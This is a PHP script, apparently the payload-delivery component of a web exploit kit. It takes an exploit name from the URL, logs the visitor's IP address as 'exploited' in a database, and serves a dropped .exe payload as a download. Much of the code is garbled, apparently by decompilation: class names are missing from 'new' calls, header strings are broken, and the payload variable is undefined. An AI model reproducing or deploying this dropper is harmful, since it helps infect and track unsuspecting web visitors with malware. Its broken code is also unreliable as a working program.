<?php


include_once( 'config.php' );
include_once( 'include/sql.php' );
include_once( 'include/visitors.php' );
$page = $_GET['e'];
$pos = strpos( $page, '..' );

if (( ( $page != '' && isset( $page ) ) && $pos === false )) {
	$inc = 'exploits/' . $page . '.php';

	if (file_exists( $inc )) {
		CSQL;
		$sql = new ( $sqlSettings );
		$sql->open(  );
		CVisitors;
		$cvisitors = new ( $sql, $sqlSettings );
		$cvisitors->setVisitorExploited( $cvisitors->getIpAddr(  ), $page );
		$sql->close(  );
		$file_data = @file_get_contents( '' . $payload_filename );
		header( 'Expires: Mon, 26 Jul 1997 05:00:00 GMT' );
		header( 'Cache-Control: no-cache' );
		header( 'Pragma: no-cache' );
		header( 'Accept-Ranges: bytes
' );
		header( 'Content-Length: ' . strlen( $file_data ) . '
' );
		header( 'Content-Disposition: inline; filename=' . $drop_filename . '.exe' );
		header( '
' );
		header( 'Content-Type: application/octet-stream

' );
		echo $file_data;
		return 1;
	}

	exit(  );
	return 1;
}

exit(  );
?>
